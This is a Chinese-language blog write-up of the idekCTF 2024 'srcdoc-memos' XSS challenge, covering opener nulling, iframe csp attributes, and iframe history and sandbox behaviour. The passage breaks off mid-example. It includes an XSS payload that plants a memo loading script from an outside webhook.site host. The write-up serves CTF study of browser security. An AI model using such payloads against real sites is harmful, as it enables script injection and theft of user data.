@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>idekCTF 2024 筆記之 iframe 高級魔法 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+            
+<link href="https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/">
+    
+
+
+
+
+
+    <meta name="description" content="在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。 由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="idekCTF 2024 筆記之 iframe 高級魔法">
+<meta property="og:url" content="https://blog.huli.tw/2024/09/07/idek-ctf-2024-iframe/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。 由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/idek-ctf-2024-iframe/cover.png">
+<meta property="article:published_time" content="2024-09-07T02:40:00.000Z">
+<meta property="article:modified_time" content="2024-09-07T04:49:48.862Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/idek-ctf-2024-iframe/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="idekCTF 2024 筆記之 iframe 高級魔法" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#srcdoc-memos">1&nbsp;&nbsp;<b>srcdoc-memos</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#困難點">2&nbsp;&nbsp;<b>困難點</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#解法">3&nbsp;&nbsp;<b>解法</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#1-iframe-的-navigation">3.1&nbsp;&nbsp;1. iframe 的 navigation</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#2-iframe-reparenting-與-bfcache">3.2&nbsp;&nbsp;2. iframe reparenting 與 bfcache</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#3-csp-的繼承">3.3&nbsp;&nbsp;3. CSP 的繼承</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#全部加在一起">3.4&nbsp;&nbsp;全部加在一起</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#總結">4&nbsp;&nbsp;<b>總結</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2024/09/07/en/idek-ctf-2024-iframe/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            idekCTF 2024 筆記之 iframe 高級魔法
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2024-09-07T02:40:00.000Z" itemprop="datePublished">2024年9月7日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。</p>
+<p>由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。</p>
+<span id="more"></span>
+
+<h2><span id="srcdoc-memos">srcdoc-memos</span></h2><p>題目連結：<a target="_blank" rel="noopener" href="https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos">https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos</a></p>
+<p>這題的程式碼如下，目標是達成 XSS 偷到預先設置好的 flag：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">escape</span> <span class="token operator">=</span> <span class="token parameter">html</span> <span class="token operator">=></span> html
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">"&amp;quot;"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;lt;"</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&amp;gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">handler</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">"http://localhost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> memo<span class="token punctuation">;</span>
+
+  <span class="token keyword">switch</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>pathname<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">case</span> <span class="token string">"/"</span><span class="token operator">:</span>
+    memo <span class="token operator">=</span>
+      cookie<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>cookie <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>memo <span class="token operator">??</span>
+      <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h2>Welcome to srcdoc memos!&lt;/h2>\n&lt;p>HTML is supported&lt;/p></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+&lt;script>
+document.head.insertAdjacentHTML(
+  "beforeend",
+  \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
+);
+if (window.opener !== null) &#123;
+  console.error("has opener");
+  document.documentElement.remove();
+&#125;
+&lt;/script>
+
+&lt;h1>srcdoc memos&lt;/h1>
+&lt;div class="horizontal">
+  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe>
+  &lt;textarea name="memo" placeholder="&lt;b>TODO&lt;/b>: ..." form="update"></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&lt;/textarea>
+&lt;/div>
+&lt;form id="update" action="/memo">
+  &lt;input type="submit" value="update memo">
+&lt;/form>
+    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">case</span> <span class="token string">"/memo"</span><span class="token operator">:</span>
+    memo <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">)</span> <span class="token operator">??</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">302</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> cookie<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token string">"memo"</span><span class="token punctuation">,</span> memo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">break</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">default</span><span class="token operator">:</span>
+    res<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">404</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其實題目本身的功能滿簡單，就是有一個 <code>/memo?memo=xxx</code> 的 API 可以設置 cookie，接著在訪問 index 的時候，會把內容放到 <code>srcdoc</code> 去，但最重要的是同個頁面上有一段 script：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">insertAdjacentHTML</span><span class="token punctuation">(</span>
+  <span class="token string">"beforeend"</span><span class="token punctuation">,</span>
+  \`<span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string">"Content-Security-Policy"</span> content<span class="token operator">=</span><span class="token string">"script-src 'none';"</span><span class="token operator">></span>\`
+<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>opener <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"has opener"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span>documentElement<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>主要會做兩件事情：</p>
+<ol>
+<li>加上 script-src none 的 CSP</li>
+<li>如果有 opener，就把內容移除掉</li>
+</ol>
+<h2><span id="困難點">困難點</span></h2><p>先別管 opener 那個，那個比較好解決，難的是 CSP。</p>
+<p>看完題目之後我的思考過程是這樣的，由於 <code>&lt;iframe srcdoc&gt;</code> 的 CSP 會繼承它的 parent，因此上層有的話，下層一定有，所以要想辦法把那個 CSP 弄掉，那既然要弄掉，我唯一能想到的就是透過 <code>&lt;iframe csp&gt;</code> 屬性先加上 CSP，就能阻止那段 script 的載入。</p>
+<p>但由於這一題的內容是透過 cookie 帶入，所以會有 same-site cookie 的限制，在我們的 origin 是沒辦法插入 iframe 的，cookie 會有問題，因此一定要在題目的 origin 使用 <code>&lt;iframe csp&gt;</code>，除了這個以外，我想不到任何方式可以把 CSP 拿掉。</p>
+<h2><span id="解法">解法</span></h2><p>之所以會說 opener 比較好解決，是因為之前就有看過類似的題目。</p>
+<p>要如何讓 opener 是 null 有幾個方法，第一個類似於 <a href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/#obligatory-calc">SekaiCTF 2022 - Obligatory Calc</a> 中所出現過的，執行 <code>window.open</code> 之後就快速關閉自己，<code>opener</code> 就會是 null，這題的作者 icesfont 用的就是這個方法（如果是在 console 上測試，會發現執行以後什麼都不會發生，因為瀏覽器預設不能在沒有動作下就開啟新的 window，所以第二個 open 會被擋住）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    &lt;script>
+      open("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">", "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">");
+      window.close();
+    &lt;\/script>
+  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>第二個方法我是在 Discord 裡面看到 Jazzy 提的，其實只要 open 之後自己把 opener 設成 null 就好：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+  w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之所以可以這樣，是因為剛開啟之後會有一小段時間，開啟的 window 跟當前 window 是 same-origin，所以這一段時間是可以操作它的，接著才會被導到要前往的 URL。</p>
+<p>雖然失去了 opener，表面上看起來跟開啟後的 window 脫節了，但其實利用 name 屬性就能夠再次存取到它，這點我以前有寫過：<a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#windowopen">iframe 與 window.open 黑魔法</a>。</p>
+<p>解決了 opener 的問題以後，就可以來看另一個最麻煩的地方，就是那一段 script，如果能讓它不執行，那很輕鬆就能做到 XSS。但要怎麼讓它不執行呢？以前有<a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp">寫過</a> iframe 上有個屬性叫做 csp，加上它之後就可以設置 CSP。</p>
+<p>如同前面所說的，因為 same-site cookie，因此要直接利用題目的 memo 功能嵌入，程式碼如下（修改自 Jazzy 在 Discord 中提供的 payload）：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+  <span class="token keyword">function</span> <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+    w<span class="token punctuation">.</span>opener <span class="token operator">=</span> <span class="token keyword">null</span>
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">let</span> html <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    html
+    &lt;script src="http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1">&lt;\/script>
+    &lt;iframe csp="script-src http: https:" src="/">&lt;/iframe>
+  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+
+  <span class="token function">openNoOpener</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用 CSP 不讓 inline script 執行，然後再載入一次網頁，就會執行原本準備好的 script。不過我實際試了一下，現在最新版會有錯誤：</p>
+<blockquote>
+<p>Refused to display ‘<a target="_blank" rel="noopener" href="http://localhost:1337/">http://localhost:1337/</a>‘ in a frame. The embedder requires it to enforce the following Content Security Policy: ‘script-src http: https:’. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one.</p>
+</blockquote>
+<p>如果頁面原本沒有 csp 的話，是沒辦法硬要加上去的。從賽後討論看起來比較舊版的 Chrome 對於 same-origin 的 csp 似乎限制沒這麼嚴格，因此只有在舊版可以（不過我也不確定就是了，我懶得找舊版來試了）。</p>
+<p>接著講一下預期解，預期解牽涉到了很多 iframe 相關的知識，我陸續花了大概一週才真的理解到底預期解為什麼可以 work，為了方便理解，我把它拆成幾個小部分，順著看完應該就可以理解最後的預期解了。</p>
+<h3><span id="1-iframe-的-navigation">1. iframe 的 navigation</span></h3><p>由於 iframe 是一個獨立的 window，因此 iframe 本身當然也可以做 navigation，導去其他的地方。假設在網頁上有一個 iframe，原本的 src 是 A，接著你把 src 改成 B，此時如果按下上一頁（或是執行 <code>history.back()</code>），會發生什麼事情呢？有兩個可能性：</p>
+<ol>
+<li>整個網頁（top level）回到上一頁</li>
+<li>iframe 回到上一頁（從 B 回到 A）</li>
+</ol>
+<p>答案是 2，也就是說，當你在做 navigation 的時候，iframe 的紀錄也會被加進整體的 history 裡面。</p>
+<p>知道這個前提之後，就可以來看一個狀況：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol>
+<li>先把 iframe 載入 test1，並且加上 sandbox，因此 script 不會執行</li>
+<li>按下 loadTest2 按鈕，把 iframe sandbox 拿掉，導去 test2，因此 script 會執行</li>
+</ol>
+<p>此時如果按下 back 按鈕，理所當然的 iframe 會回到 test1，但是 sandbox 可能會有兩種狀況：</p>
+<ol>
+<li>sandbox 也一起回到載入 test1 時的狀況</li>
+<li>sandbox 維持現在的屬性，也就是沒有 sandbox</li>
+</ol>
+<p>答案會是 2，sandbox 的屬性不會變，因此按下 back 之後，sandbox 沒了，test1 的 script 現在就可以執行了。</p>
+<p>其實感覺也滿合理的，畢竟你只是改動 src 而已，沒有動 sandbox，因此 sandbox 維持在最新的狀態。</p>
+<h3><span id="2-iframe-reparenting-與-bfcache">2. iframe reparenting 與 bfcache</span></h3><p>剛剛的狀況是更改 sandbox 並且載入新的 src 之後，回到上一頁。接下來我們再來看另一個狀況，前半段相同，但載入新的 src 之後，我們不直接回到上一頁，而是先把整個網頁跳轉到其他頁面，接著才回去：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
